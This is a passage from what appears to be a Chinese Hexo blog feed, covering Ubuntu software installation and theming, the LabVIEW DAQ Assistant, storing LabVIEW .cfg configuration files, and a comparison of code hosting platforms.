href="#系统指示器Syspeek" class="headerlink" title="系统指示器Syspeek"></a>系统指示器Syspeek</h3><pre><code class="bash">sudo add-apt-repository ppa:nilarimogard/webupd8sudo apt-get updatesudo apt-get install syspeek  </code></pre><h3 id="Hexo-amp-amp-Gitbook"><a href="#Hexo-amp-amp-Gitbook" class="headerlink" title="Hexo &amp;&amp; Gitbook"></a>Hexo &amp;&amp; Gitbook</h3><p>首先安装<code>node.js</code>与<code>npm</code>,然后使用<code>npm</code>安装<code>hexo</code>与<code>gitbook</code></p><pre><code class="bash">npm install hexo-cli -gnpm install -g gitbook-cligitbook -V</code></pre><h3 id="必备软件"><a href="#必备软件" class="headerlink" title="必备软件"></a>必备软件</h3><ul><li>汉字输入法： 搜狗拼音</li><li>音乐播放器： 网易云音乐</li></ul><pre><code class="bash">sudo dpkg -i netease-cloud-music_1.0.0_amd64_ubuntu16.04.deb   # 下载安装包后执行该指令sudo apt-get -f install</code></pre><ul><li>视频播放器： VLC（自带software 管理软件中下载安装）</li><li>网络浏览器： Google Chrome</li></ul><pre><code class="bash">sudo dpkg -i google-chrome-stable_current_amd64.deb   # 下载安装包后执行该指令sudo apt-get -f install</code></pre><ul><li>截图软件： Shutter</li><li>社交软件： <a href="https://github.com/geeeeeeeeek/electronic-wechat.git">微信</a></li><li>办公软件： WPS</li></ul><h2 id="系统美化"><a href="#系统美化" class="headerlink" title="系统美化"></a>系统美化</h2><p>参考资料：<a href="http://www.jcodecraeer.com/plus/view.php?aid=3502">http://www.jcodecraeer.com/plus/view.php?aid=3502</a></p><h3 id="安装Flatabulous主题"><a href="#安装Flatabulous主题" class="headerlink" title="安装Flatabulous主题"></a>安装Flatabulous主题</h3><ul><li>首先安装 Unity-tweak-tool软件（从Ubuntu软件商店可以找到）</li><li>然后在<code>~</code>目录下创建系统主题文件夹<code>.themes</code></li></ul><pre><code class="bash">mkdir ~/.themes</code></pre><ul><li>在<a href="https://github.com/anmoljagetia/Flatabulous/archive/master.zip">https://github.com/anmoljagetia/Flatabulous/archive/master.zip</a> 下载 Flatabulous 主题</li><li>解压主题后移动到<code>~/.themes</code>文件夹下</li><li>打开tweak软件，在theme面板中选择Flatabulous主题</li></ul><h3 id="安装ultra-flat-icons图标主题"><a href="#安装ultra-flat-icons图标主题" class="headerlink" title="安装ultra-flat-icons图标主题"></a>安装ultra-flat-icons图标主题</h3><ul><li>安装图标主题</li></ul><pre><code class="bash">sudo add-apt-repository ppa:noobslab/icons  sudo apt-get update  sudo apt-get install ultra-flat-icons</code></pre><ul><li>在tweak软件中的icon面板中选择Ultra-flat</li></ul>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ubuntu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Labview - DAQ 助手详解</title>
      <link href="2017/04/24/labview-DAQ/"/>
      <url>2017/04/24/labview-DAQ/</url>
      
        <content type="html"><![CDATA[<h2 id="DAQ-助手简介"><a href="#DAQ-助手简介" class="headerlink" title="DAQ 助手简介"></a>DAQ 助手简介</h2><h3 id="Express-VI"><a href="#Express-VI" class="headerlink" title="Express VI"></a>Express VI</h3><p><code>Express VI</code> 是 LabVIEW 7 及更高版本拥有的快速 VI，此类 VI 将一些常见的功能打包，然后封装在简单易用的交互式的 VI 程序中，方便开发人员配置参数和实现功能。</p><p><code>DAQ</code> 助手是完成信号采集任务的常用工具，以 <code>Express VI</code> 的形式呈现，具有交互式的配置界面，配合 NI 公司提供的采集卡，可以完成绝大部分的信号采集任务。</p><h3 id="使用方法简述（采集-AI-信号）"><a href="#使用方法简述（采集-AI-信号）" class="headerlink" title="使用方法简述（采集 AI 信号）"></a>使用方法简述（采集 AI 信号）</h3><h4 id="选择信号类型"><a href="#选择信号类型" class="headerlink" title="选择信号类型"></a>选择信号类型</h4><p><img src="/assets/labview/daqAssistant/selectSignal.png" alt="DAQ助手信号类型选择界面"></p><p>在采集卡（虚拟的或实际的均可）已连接的情况下，从 VI 的程序框图中打开 <code>DAQ</code> 助手，选择待采集信号的类型，此处选择模拟输入电压信号。</p><h4 id="选择物理通道"><a href="#选择物理通道" class="headerlink" title="选择物理通道"></a>选择物理通道</h4><p><img src="/assets/labview/daqAssistant/selectChannel.png" alt="DAQ助手物理通道选择界面"></p><p>选择通道时，按住<code>Ctrl</code> 或 <code>Shift</code> 可同时选择多路通道</p><h4 id="配置信号采集参数"><a href="#配置信号采集参数" class="headerlink" title="配置信号采集参数"></a>配置信号采集参数</h4><p><img src="/assets/labview/daqAssistant/daqConfig.png" alt="DAQ助手通道配置界面"></p><p>配置界面中可以进行物理通道的删除与添加，通道名称的修改，接线端连接方式的选择，采集模式的选择等操作，配置界面右侧对于每个选项都有详细说明。</p><p>信号采集模式包含“1 采样”、“N 采样”和“连续采样” 3 大类。对于连续采样而言，采样率决定了信号采样的间隔时间，通常将其设为最大有效信号频率的 10 倍左右；采样点数指定了连续采样时的数据缓冲区大小，简单来说，就是每次采样后得到的待处理数据长度，待读取采样与采样率之比就是连续采样的间隔时间。</p><p>此外，信号输入范围默认为 <code>-10~10v</code> ；接线端配置默认为差分输入，通常情况下，我们会选择单端输入 <code>RSE</code>，表示一端接 <code>AGND</code>，一端接输入端口，不同的接线端配置方式对应的连线图也不一致，在进行信号端口连线时需要按所选方式进行连接。</p><h4 id="启用-TDMS-记录"><a href="#启用-TDMS-记录" class="headerlink" title="启用 TDMS 记录"></a>启用 TDMS 记录</h4><p><img src="/assets/labview/daqAssistant/saveTdms.png" alt="DAQ助手启用TDMS记录"></p><p>在配置界面中，还可以选择是否将采集的数据记录至 <code>TDMS</code> 文件中，同时可以选择好默认的存储路径、记录模式和组名。如果信号采集结束后需要实时处理，需要将记录模式设为“记录并读取”，如果仅仅是记录而无需处理，则选择“仅记录”。组名将会显示在 <code>TDMS</code> 文件的分组列表中。</p><p>如果记录时间很长，长达几个小时甚至几天时，此时由于数据量过大，可以勾选“包含多个文件”，并规定单个文件的存储容量。</p><h4 id="配置接口"><a href="#配置接口" class="headerlink" title="配置接口"></a>配置接口</h4><p><img src="/assets/labview/daqAssistant/daqIcon.png" alt="DAQ助手配置完成图"></p><p>当采集信息确定好以后，会在程序框图中生成相应的 <code>DAQ</code> 图标，后续如果需要更改参数，可以参考以下两种方法：</p><ol><li>双击 <code>DAQ</code> 助手，打开配置界面更改需要更新的参数</li><li>通过 <code>DAQ</code> 助手提供的输入接口，从前面板或程序框图修改相应参数</li></ol><h2 id="DAQ-助手程序解析"><a href="#DAQ-助手程序解析" class="headerlink" title="DAQ 助手程序解析"></a>DAQ 助手程序解析</h2><p>对 <code>Express VI</code> 而言，双击无法打开程序框图，打开的是配置界面。此外，<code>Express VI</code> 的程序是动态的，对于 <code>DAQ</code> 助手而言，选择不同的通道数，不同的信号类型，其产生的执行程序都不一样。下面以双通道连续采集模拟输入电压信号为例，解析 <code>DAQ</code> 助手的内部执行程序。</p><h3 id="Express-VI-转标准子-VI"><a href="#Express-VI-转标准子-VI" class="headerlink" title="Express VI 转标准子 VI"></a>Express VI 转标准子 VI</h3><p>想要查看 <code>DAQ</code> 助手的程序框图，必须先将其转换为标准子 VI，转换方法很简单，选择 <code>DAQ</code> 助手，右键选择“打开前面板”或“open front panel”（英文版）。</p><h3 id="整体程序框图"><a href="#整体程序框图" class="headerlink" title="整体程序框图"></a>整体程序框图</h3><p><img src="/assets/labview/daqAssistant/daqDiagram.png" alt="DAQ助手程序框图"></p><p>上图是 <code>DAQ</code> 助手的程序框图，可简化为如下图所示的程序流程图，图中的一对移位寄存器代指的是信号采集任务句柄。</p><p><img src="/assets/labview/daqAssistant/daqDiagram_visio.png" alt="DAQ助手程序框图"></p><h3 id="程序解析"><a href="#程序解析" class="headerlink" title="程序解析"></a>程序解析</h3><p>下面对以上程序框图中的每个模块进行详细分析。</p><h4 id="创建采集任务"><a href="#创建采集任务" class="headerlink" title="创建采集任务"></a>创建采集任务</h4><p><img src="/assets/labview/daqAssistant/daqDiagram_1.png" alt="DAQ助手局部程序框图1"></p><p>图中包含两个移位寄存器，上面的寄存器用于存储采集任务的引用句柄，当该句柄无效或首次调用该 VI 时会执行 <code>DAQmx Create Task</code> 函数，即创建新的采集任务，并产生新任务的引用句柄。</p><h4 id="生成通道名称"><a href="#生成通道名称" class="headerlink" title="生成通道名称"></a>生成通道名称</h4><p><img src="/assets/labview/daqAssistant/daqDiagram_2.png" alt="DAQ助手局部程序框图2"></p><p>添加物理通道前，需要选择好相应的通道名称，模拟输入信号简称 <code>ai</code>，通道名称格式为 <code>ain</code>, n 从 0 开始增加。在此例中，所选通道为 <code>ai0</code> 与 <code>ai1</code>。设备名为 <code>Dev1</code>,所以最终得到的通道名称为 <code>Dev1/ai0</code> 与 <code>Dev1/ai1</code>。正常情况下，该条件结构内的程序仅在首次调用时执行一次。</p><h4 id="添加物理通道"><a href="#添加物理通道" class="headerlink" title="添加物理通道"></a>添加物理通道</h4><p><img src="/assets/labview/daqAssistant/daqDiagram_3.png" alt="DAQ助手局部程序框图3"></p><p>确定好通道名称后，便可根据需求添加相应的物理通道了，如图所示，标志 ① 连接的是输入接线端配置参数，往下的参数可以参考如下的函数 <code>IO</code> 接口图。之所以用 <code>for</code> 循环，是因为每个采集通道均需调用一次 <code>DAQmx Create Channel</code> 函数。本例创建的通道数为 2，所以 <code>for</code> 循环的执行次数为 2。</p><p><img src="/assets/labview/daqAssistant/daqDiagram_3_1.png" alt="DAQ助手局部程序框图3-1"></p><h4 id="配置采样时钟"><a href="#配置采样时钟" class="headerlink" title="配置采样时钟"></a>配置采样时钟</h4><p><img src="/assets/labview/daqAssistant/daqDiagram_4.png" alt="DAQ助手局部程序框图4"></p><p>对于连续采样模式，必须调用 <code>DAQmx Timing</code> 定时函数，配置好采样率和采样点数。但在此处需要注意的是，<code>DAQ</code> 助手并没有实现采集过程中修改采样频率 <code>Sample rate</code> 的功能，也就是说：在信号采集过程中，无法修改采样频率，直到采集任务出错或停止。如果实际应用中有采集过程中修改采样率的需求，只能另行编写采集程序，这也是 <code>Express VI</code> 不够灵活的一个体现。</p><h4 id="配置-TDMS-记录"><a href="#配置-TDMS-记录" class="headerlink" title="配置 TDMS 记录"></a>配置 TDMS 记录</h4><p><img src="/assets/labview/daqAssistant/daqDiagram_5.png" alt="DAQ助手局部程序框图5"></p><p><code>TDMS</code> 文件记录是非常常用的功能，可以将采集到的信号快速存储至 <code>.tdms</code> 文件中。使用 <code>DAQmx Configure Logging(TDMS)</code> 函数配置 <code>TDMS</code> 记录功能时，可参考如下接口，设置好记录模式、组名、文件路径等。</p><p><img src="/assets/labview/daqAssistant/daqDiagram_5_1.png" alt="DAQ助手局部程序框图5-1"></p><h4 id="开始任务"><a href="#开始任务" class="headerlink" title="开始任务"></a>开始任务</h4><p><img src="/assets/labview/daqAssistant/daqDiagram_6.png" alt="DAQ助手局部程序框图6"></p><p>当采集任务相关的参数都配置完成后，即可开始任务 <code>DAQmx Start Task</code>。</p><p>此前 6 个步骤仅需执行一次，直到下一次重启软件或出现异常。</p><h4 id="信号采集"><a href="#信号采集" class="headerlink" title="信号采集"></a>信号采集</h4><p><img src="/assets/labview/daqAssistant/daqDiagram_7.png" alt="DAQ助手局部程序框图7"></p><p>开始任务后，物理采集卡就将按照给定的参数开始采集，并将数据存放至采集卡内的缓冲区内，通过相应的 <code>DAQmx Read</code> 函数，选择合适的采样方式（此处选为“模拟1D波形N通道N采样”）， <code>DAQ</code> 驱动程序便会从采集卡的缓冲区中读取数据，并默认以动态数据格式 DDT(Dynamic Data Type) 输出。<code>DAQ</code> 助手返回的动态数据便是该函数返回的数据 <code>data</code>。</p><h4 id="异常处理"><a href="#异常处理" class="headerlink" title="异常处理"></a>异常处理</h4><p><img src="/assets/labview/daqAssistant/daqDiagram_8.png" alt="DAQ助手局部程序框图8"></p><p>所谓异常处理，指的注意异常情况是采集卡在信号采集过程中被拔出，导致采集任务无法继续执行，此时 <code>DAQ</code> 助手将会停止并清除任务，并将任务的引用句柄重置为空。下一次 while 循环将判断出该空句柄，然后重新创建任务，如果采集任务被顺利创建，说明异常已解除，采集卡已重新连接，采集任务便可自动继续进行；如果采集任务创建失败，则循环创建任务直到成功为止。</p><p>当然还有一种非异常情况也会停止并清除任务，那就是用户手动点击停止按钮 stop ，任务正常终止。</p><h2 id="DAQ-助手程序简化"><a href="#DAQ-助手程序简化" class="headerlink" title="DAQ 助手程序简化"></a>DAQ 助手程序简化</h2><p>从上面的解析可以看出，<code>DAQ</code> 助手作为通用型工具，包含了所有需要的配置参数。<code>DAQ</code> 助手有其方便之处，但同时也存在许多不灵活的地方：</p><ol><li>经测试，对于单通道和 N 通道的采集任务，DAQ 助手的执行程序结构完全一致，生成通道名称和添加物理通道均采用了 for 循环结构，这对单通道采集原本是不需要的；</li><li>实际应用中，添加物理通道时，有许多参数使用默认值即可，过多的参数只会使代码显得冗余；</li><li>上述提及的一个问题：无法在采集过程中修改采样率；</li><li>存储 TDMS 文件时，默认会存储所有通道的数据，无法单独指定需要进行数据存储的通道；</li><li>若要采集编码器的计数值时，使用 <code>DAQ</code> 助手的配置界面无法返回整型的原始计数值。</li></ol><p>鉴于以上种种原因，在实际编程过程中，完全可以使用底层的 <code>DAQmx</code> 函数编写信号采集程序，或者在原有的 <code>DAQ</code> 助手程序基础上修改和简化。</p><h3 id="简化后程序"><a href="#简化后程序" class="headerlink" title="简化后程序"></a>简化后程序</h3><p>此处提供一个将上述代码简化并添加采样率可修改的程序。</p><p><img src="/assets/labview/daqAssistant/daqCustomsize.png" alt="DAQ助手简化改进版"></p><p>在该修改版中，去掉了大量的默认参数，减少了条件分支个数；添加了一个反馈节点，用以判断采样率的变化情况，在采样率改变时，该程序将删除原有任务，并重新创建新的任务。</p><h3 id="下载链接"><a href="#下载链接" class="headerlink" title="下载链接"></a>下载链接</h3><p><a href="http://pan.baidu.com/s/1i50wss9">http://pan.baidu.com/s/1i50wss9</a></p>]]></content>
      
      
      <categories>
          
          <category> Language </category>
          
          <category> LabVIEW </category>
          
      </categories>
      
      
        <tags>
            
            <tag> labview </tag>
            
            <tag> tdms </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Labview - 存储 .cfg 配置文件</title>
      <link href="2017/03/25/labview-cfg/"/>
      <url>2017/03/25/labview-cfg/</url>
      
        <content type="html"><![CDATA[<h2 id="配置文件简介"><a href="#配置文件简介" class="headerlink" title="配置文件简介"></a>配置文件简介</h2><p>在 LabVIEW 应用软件开发过程中，对于稍微大型一点的软件而言，一般都需要在本地文件中保存一些配置参数，如在 windows 系统中安装软件时，安装程序在 C 盘 documents 文件夹下自动创建的用户数据。对于需要更新的配置参数或者重要的常值参数，在 LabVIEW 中可以使用 <code>.cfg</code> 格式的配置文件进行存储与读取。</p><h3 id="应用场合"><a href="#应用场合" class="headerlink" title="应用场合"></a>应用场合</h3><ul><li>软件的全局配置参数（如：串口通讯参数，DAQ 采样参数，信号处理参数，···）</li><li>软件主界面关闭前的输入、输出控件的最新数值</li><li>报表生成时的默认信息（如：署名，标题，摘要，···）</li><li>统计量（如：游戏最高分，排行榜排名，参与次数，···）</li><li>···</li></ul><h3 id="cfg-文件格式"><a href="#cfg-文件格式" class="headerlink" title=".cfg 文件格式"></a>.cfg 文件格式</h3><p>如下所示，<code>.cfg</code> 文件的数据存储格式格式满足标记性语言的特点，有点类似于 <code>JSON</code> 和 <code>XML</code>，但与之不同的是 <code>.cfg</code> 不支持数据嵌套。<code>.cfg</code> 文件以<strong>段</strong>为基本单位、以<strong>键</strong>为最小单位组织数据，<strong>段</strong>包含了相应的<strong>段名</strong>及该段包含的所有键，每个<strong>键</strong>包含了相应的<strong>键名</strong>和<strong>键值</strong>，中间用等号连接。</p><pre><code class="txt">[段名1]键名1 = 键值1键名2 = 键值2键名3 = 键值3[段名2]键名4 = 键值4键名5 = 键值5键名6 = 键值6[段名3]键名7 = 键值7键名8 = 键值8</code></pre><p><strong>举例说明</strong>：某人要保存自己每日的就餐时间，此时可用一个<strong>段</strong>来存储，<strong>段名</strong>为“就餐时间”，三个<strong>键名</strong>依次为早餐、午餐和晚餐，具体的时间以字符串格式存储，存储后的结果如下：</p><pre><code class="txt">[就餐时间]早餐 = 07:30午餐 = 12:00晚餐 = 05:30</code></pre><h3 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h3><p>LabVIEW 提供的与配置文件存取相关的函数支持以下6种数据类型，其中布尔型即开关量，仅包含 <code>TRUE</code>, <code>FALSE</code> 两个值；路径指的是文件或文件夹的路径。</p><ul><li>有符号整型： <code>I8</code>, <code>I16</code>, <code>I32</code></li><li>无符号整型： <code>U8</code>, <code>U16</code>, <code>U32</code></li><li>浮点型： <code>DBL</code>, <code>SGL</code></li><li>布尔型： <code>BOOL</code></li><li>字符串： <code>STRING</code></li><li>路径： <code>PATH</code></li></ul><h3 id="变体"><a href="#变体" class="headerlink" title="变体"></a>变体</h3><p>LabVIEW 提供了一种特殊的数据类型——变体，变体类似于 C 语言中的空类型指针 <code>void*</code>，不代表具体的类型，但可以存储任意类型的数据。</p><p>在存储配置文件时，可以先将满足 <a href="#1-3-%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B">1.3</a> 中类型的数据转换为变体数据，然后以变体数组形式存储，方便统一管理；同样，在读取配置文件时，也可以先将数据读取到变体数组中，后续再进一步解析。具体操作步骤后面会有详述。</p><h2 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h2><p>了解了配置文件的格式及数据类型，下面介绍如何在 LabVIEW 实现配置文件的存取。</p><h3 id="配置函数"><a href="#配置函数" class="headerlink" title="配置函数"></a>配置函数</h3><p>LabVIEW 提供了以下函数供开发人员使用：</p><p><img src="/assets/labview/rwCFG/ConfigFunc.png" alt="ConfigFunc.vi"></p><p>但应用较多的与配置文件存取相关的函数主要有：</p><ol><li>打开配置数据</li><li>关闭配置数据</li><li>转换至变体</li><li>从变体转换至数据</li><li>写入键</li><li>读取键</li></ol><h4 id="打开配置数据"><a href="#打开配置数据" class="headerlink" title="打开配置数据"></a>打开配置数据</h4><p><img src="/assets/labview/rwCFG/OpenConfigData.png" alt="OpenConfigData.vi"></p><p><code>Open Config Data.vi</code> 用于打开配置文件，如果文件不存在则先创建再打开，返回引用句柄用于后续的数据存取。</p><h4 id="关闭配置数据"><a href="#关闭配置数据" class="headerlink" title="关闭配置数据"></a>关闭配置数据</h4><p><img src="/assets/labview/rwCFG/CloseConfigData.png" alt="CloseConfigData.vi"></p><p>该函数与 <code>Open Config Data.vi</code> 成对出现，在对配置文件进行存取操作后，需要使用 <code>Close Config Data.vi</code> 关闭对配置文件的引用，释放配置文件占用的内存。</p><h4 id="转换至变体"><a href="#转换至变体" class="headerlink" title="转换至变体"></a>转换至变体</h4><p><img src="/assets/labview/rwCFG/ToVariant.png" alt="ToVariant.vi"></p><p><code>To Variant.vi</code> 可将任意数据类型的数据转换为变体数据。</p><h4 id="从变体转换至数据"><a href="#从变体转换至数据" class="headerlink" title="从变体转换至数据"></a>从变体转换至数据</h4><p><img src="/assets/labview/rwCFG/VariantToData.png" alt="VariantToData.vi"></p><p><code>Variant To Data.vi</code> 是 <code>To Variant.vi</code> 的逆过程，通过指定数据类型，可以将变体数据还原为转换为变体前的数据。</p><h4 id="写入键"><a href="#写入键" class="headerlink" title="写入键"></a>写入键</h4><p><img src="/assets/labview/rwCFG/WriteKey.png" alt="WriteKey.vi"></p><p>除错误簇外，<code>Write Key.vi</code> 包含4个输入：<strong>段</strong>对应字符串类型的<strong>段名</strong>，<strong>键</strong>对应字符串类型的<strong>键名</strong>，<strong>值</strong>对应任意数据类型的<strong>键值</strong>，<strong>引用句柄</strong>用于连接配置文件的引用句柄。说明：LabVIEW 中的引用句柄等同于 <code>C/C++</code> 语言中的引用，即变量的别名。</p><p>该函数根据输入参数将键名和键值保存到配置文件的指定段中，如果是首次创建指定的段，则自动在配置文件中添加新的段及键；如果段已存在键不存在，则仅添加键；如果段与键均已存在，则仅用新键值替换旧键值。</p><h4 id="读取键"><a href="#读取键" class="headerlink" title="读取键"></a>读取键</h4><p><img src="/assets/labview/rwCFG/ReadKey.png" alt="ReadKey.vi"></p><p>使用 <code>Read Key.vi</code> ，通过<strong>段名</strong>和<strong>键名</strong>，我们可以从指定文件中获取所需的数据。</p><p>需要说明的是， <code>Read Key.vi</code> 是多态VI，其键值的数据类型是多态可选的，可选项参见 <a href="#1-3-%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B">1.3</a>。</p><h3 id="存储配置文件"><a href="#存储配置文件" class="headerlink" title="存储配置文件"></a>存储配置文件</h3><p>说了一大堆，那到底如何存储呢，还是用程序框图来说话吧，一目了然。</p><ul><li><strong><code>RWConfigData.vi</code> 写操作</strong></li></ul><p><img src="/assets/labview/rwCFG/WriteToFile.png" alt="RWConfigData.vi Write Data"></p><p>该 VI 名为 <strong><code>RWConfigData.vi</code></strong> ，不涉及配置文件的打开与关闭，是配置文件打开以后的操作，文件的引用句柄为 <code>refnum in</code> 和 <code>refnum out</code> 。函数接口如下：</p><p><img src="/assets/labview/rwCFG/WriteToFileInterface.png" alt="RWConfigData.vi Interface"></p><p>插播一句，在 LabVIEW 中，许多函数的输入输出都是成对出现的，尤其是引用句柄和错误簇，这有点类似于 java 语言中用于返回当前对象的 this 指针，便于实现函数的链式调用，令代码更简洁，并增强代码的可读性。</p><p>言归正传，以上程序框图中，<code>CMD</code> 是个枚举变量，包含 <code>Write</code> 和 <code>Read</code> 两个值，分别对应文件的写操作和读操作；输入参数 <code>DataParam</code> 是一个簇，包含了需要存储的数据，簇包含的数据元素如下：</p><pre><code class="txt">SectionName : 段名（单个字符串）KeyName : 键名（一维的字符串数组）DataType : 数据类型（一维的枚举数组，枚举包含了文中提及的 6 种数据类型）VariantData : 键值数据（一维的变体数组）</code></pre><p>用变体数组的方式可以批量处理待存参数，高效便捷，唯一繁琐的一点就是需要先将待存参数均都转换为变体数据。上面的程序框图仅显示了布尔型数据的存储方式，其它类型的数据的存储方式与之相似，每种类型的数据对应一个条件分支。</p><p><img src="/assets/labview/rwCFG/WriteToFile1.png" alt="RWConfigData.vi Write Data"></p><ul><li><strong><code>RWSingleElement.vi</code> 写操作</strong></li></ul><p>对于单个参数的存储，同样可以使用该函数，结合配置文件的打开、关闭函数，具体代码实现如下：</p><p><img src="/assets/labview/rwCFG/WriteSingleData.png" alt="RWSingleElement.vi Write Data"></p><p>代码中的元素信息就是某个待存参数的相关信息，用到的存储子 VI 就是上面描述的 <strong><code>RWConfigData.vi</code></strong> 。该程序本身 <strong><code>RWSingleElement.vi</code></strong> 的函数接口如下：</p><p><img src="/assets/labview/rwCFG/WriteSingleDataInterface.png" alt="RWSingleElement.vi Interface"></p><h3 id="读取配置文件"><a href="#读取配置文件" class="headerlink" title="读取配置文件"></a>读取配置文件</h3><p>与存储相对应的操作是读取，上面提及的两个VI <strong><code>RWConfigData.vi</code></strong> 和 <strong><code>RWSingleElement.vi</code></strong> 对应的 <code>Read</code> 分支分别如下：</p><ul><li><strong><code>RWConfigData.vi</code> 读操作</strong></li></ul><p><img src="/assets/labview/rwCFG/ReadFromFile.png" alt="RWConfigData.vi Read Data"></p><ul><li><strong><code>RWSingleElement.vi</code> 读操作</strong></li></ul><p><img src="/assets/labview/rwCFG/ReadSingleData.png" alt="RWSingleElement.vi Read Data"></p><h2 id="配置文件存储例程"><a href="#配置文件存储例程" class="headerlink" title="配置文件存储例程"></a>配置文件存储例程</h2><p>下面给出一个非常简单的配置文件存取示例程序。</p><ul><li><strong>示例程序前面板</strong></li></ul><p><img src="/assets/labview/rwCFG/DemoFrontPanel.png" alt="RWConfigFileDemo.vi FrontPanel"></p><ul><li><strong>示例程序框图 写操作</strong></li></ul><p><img src="/assets/labview/rwCFG/DemoWriteData.png" alt="RWConfigFileDemo.vi Block diagram: Write"></p><ul><li><strong>示例程序框图 读操作</strong></li></ul><p><img src="/assets/labview/rwCFG/DemoReadData.png" alt="RWConfigFileDemo.vi Block diagram: Read"></p><ul><li><strong>示例程序 执行结果</strong></li></ul><p><img src="/assets/labview/rwCFG/DemoResultFile.png" alt="RWConfigFileDemo.vi Result File"></p><h2 id="下载链接"><a href="#下载链接" class="headerlink" title="下载链接"></a>下载链接</h2><p><a href="http://pan.baidu.com/s/1eRRVqRg">http://pan.baidu.com/s/1eRRVqRg</a></p><p>PS：最后友情说明一下，其实文件扩展名不一定要设为 <code>.cfg</code> ，其它类似 <code>.ini</code> , <code>.sys</code> 等扩展名也都是可以的。</p>]]></content>
      
      
      <categories>
          
          <category> Language </category>
          
          <category> LabVIEW </category>
          
      </categories>
      
      
        <tags>
            
            <tag> labview </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>常用的代码托管平台</title>
      <link href="2017/03/23/code-Platform/"/>
      <url>2017/03/23/code-Platform/</url>
      
        <content type="html"><![CDATA[<p>作为一名程序员，最不缺的就是代码，那自然得选择个好用的代码托管平台，本文将对常用的几个平台进行简要描述。</p><h2 id="Github"><a href="#Github" class="headerlink" title="Github"></a>Github</h2><p><img src="/assets/introduction/codePlatform/github.png" alt="github"></p><p>毋庸置疑，<a href="https://github.com/">Github</a> 是全球应用最广的代码托管平台，兼社交平台，本博客便承载于 Github 的 pages 服务。但是使用 Github 保存私有项目是要收费的，所以我主要用其管理可公布于众的开源项目。</p><h2 id="GitLab"><a href="#GitLab" class="headerlink" title="GitLab"></a>GitLab</h2><p><img src="/assets/introduction/codePlatform/gitlab.png" alt="gitLab"></p><p><a href="https://gitlab.com/">gitLab</a> 相比于 <code>Github</code> 具有更多的特性，官方点明的特性有：</p><ul><li>Unlimited repositories</li><li>Unlimited private collaborators</li><li>10GB disk space per project (including Git LFS)</li><li>Unlimited total disk space</li><li>Completely free, no credit card required</li><li>Unlimited CI Runners to do parallel testing</li><li>Alternate SSH port for git+ssh (443)</li></ul><h2 id="Visual-Studio-Team-Services-VSTS"><a href="#Visual-Studio-Team-Services-VSTS" class="headerlink" title="Visual Studio Team Services(VSTS)"></a>Visual Studio Team Services(VSTS)</h2><p><img src="/assets/introduction/codePlatform/VS-team-services.png" alt="VS Team Services"></p><p>微软提供的 <a href="https://www.visualstudio.com/team-services/">Team Services</a> 也是相当出色的团队协作服务平台，为开发人员或团队协助开发提供线上服务，提供了项目管理、版本控制、自动建置、自动测试、部署发行管理等功能，并且支持各种语言、开发平台或是 IDE 工具等，五人以下团队可免费使用。</p><p>微软的亲儿子 <a href="https://www.visualstudio.com/">Visual Studio</a> 现已更新至 2017 版，从早期版本便已集成了 <code>VSTS</code> 工具，在 <code>VS</code> 中，配合 <code>git</code> 或 Team Foundation Version Control (<code>TFVC</code>) 版本控制系统，从团队资源管理器可以方便上传代码至 <code>VSTS</code> 服务器，还可以从 <code>Github</code> 等其它平台进行项目克隆。我通常在使用 <code>VS</code> 进行软件开发时可用它来管理代码。</p><p><img src="/assets/introduction/codePlatform/VSTS.png" alt="VSTS"></p><h2 id="Bitbucket"><a href="#Bitbucket" class="headerlink" title="Bitbucket"></a>Bitbucket</h2><p><img src="/assets/introduction/codePlatform/bitbucket.png" alt="Bitbucket"></p><p><a href="https://bitbucket.org/">Bitbucket</a> 是一个源代码托管网站，采用 Mercurial 和 git 作为版本控制系统，对于小等于5人的小团队提供免费托管服务，算是非常不错的 <code>Github</code> 替代品。</p><h2 id="Coding"><a href="#Coding" class="headerlink" title="Coding"></a>Coding</h2><p><img src="/assets/introduction/codePlatform/coding.png" alt="coding"></p><p><a href="https://coding.net/">Coding</a> 官方介绍：</p><blockquote><p>CODING 是国内首个一站式云端软件服务平台，于 2014 年 2 月在深圳成立，并于北京、上海、成都、西雅图设立分部。在云计算时代，CODING 致力于通过技术创新推动软件开发与交付模式的转变，让开发更简单。</p></blockquote><p>coding 是国内少有的做得非常棒的代码托管平台之一，于 2016 年 3 月 2 日收购了 2011 年成立的 <a href="https://coding.net/gitcafe.html">GitCafe</a>，能够免费存储私有项目和开源项目，包含有趣的社交平台 “冒泡”，大型的众包平台 “码市”，同样支持 pages 服务，我主要用其管理私有项目。</p><h2 id="华为-DevCloud"><a href="#华为-DevCloud" class="headerlink" title="华为 DevCloud"></a>华为 DevCloud</h2><p><img src="/assets/introduction/codePlatform/devCloud.png" alt="DevCloud"></p><p><code>2017.3.22</code>参加了华为在青岛香格里拉酒店举办的软件开发云大会，又了解了一款企业级的集华为研发实践、前沿研发理念、先进研发工具为一体的研发云平台 <a href="http://www.hwclouds.com/devcloud/">DevCloud</a> ，面向开发者提供研发工具服务，让软件开发简单高效，对国内开发者而言绝对是一大福音了。同样，该平台功能强大，自然也少不了基础的代码托管功能。</p><p><img src="/assets/introduction/codePlatform/devCloudFuncs.png" alt="DevCloudFuntions"></p><h2 id="码云"><a href="#码云" class="headerlink" title="码云"></a>码云</h2><p><img src="/assets/introduction/codePlatform/codeCloud.png" alt="codeCloud"></p><p><a href="http://git.oschina.net/">码云</a> 依托于国内知名网站 <a href="https://www.oschina.net/">开源中国</a>，界面与 <code>Github</code> 非常相像，可免费托管私有、开源项目。</p><h2 id="CSDN"><a href="#CSDN" class="headerlink" title="CSDN"></a>CSDN</h2><p><img src="/assets/introduction/codePlatform/csdnCode.png" alt="csdnCode"></p><p><a href="http://bbs.csdn.net/">CSDN</a> 号称全球最大中文IT社区，社区内的 <a href="https://code.csdn.net/">CODE</a> 模块为开发者提供了代码托管服务，每个项目的使用空间为<code>1GB</code>.</p><p>本人目前作为学生党，最常用的还是 <code>Github</code> 和 <code>Coding</code> ，平台再多，还是要选择最合适自己的嘛。</p>]]></content>
      
      
      <categories>
          
          <category> Tools </category>
          
      </categories>
